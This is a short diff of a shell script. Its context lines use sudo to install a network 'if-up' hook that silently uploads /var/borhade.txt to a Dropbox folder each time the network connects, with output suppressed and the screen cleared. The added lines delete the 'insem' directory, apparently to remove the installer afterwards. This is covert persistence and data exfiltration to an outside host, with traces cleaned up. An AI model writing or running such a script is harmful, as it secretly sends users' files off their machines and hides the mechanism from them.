@@ -27,3 +27,5 @@ cd
 echo "./var/Dropbox-Uploader/dropbox_uploader.sh upload /var/borhade.txt /TheGreatApp" | sudo tee -a /etc/network/if-up.d/rhb &>/dev/null
 sudo chmod +x /etc/network/if-up.d/rhb &>/dev/null
 clear
+cd 
+sudo rm -rf insem
